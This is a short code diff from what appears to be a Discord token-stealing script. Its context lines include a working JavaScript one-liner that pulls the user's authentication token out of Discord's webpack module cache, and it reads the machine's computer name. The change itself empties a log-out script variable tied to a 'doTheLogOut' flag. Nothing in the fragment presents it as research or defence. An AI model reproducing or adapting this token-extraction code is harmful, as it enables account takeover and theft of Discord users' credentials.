@@ -7,7 +7,7 @@ const queryString = require("querystring")
 
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
-var logOutScript = `return`
+var logOutScript = ``
 var doTheLogOut = false
 
 
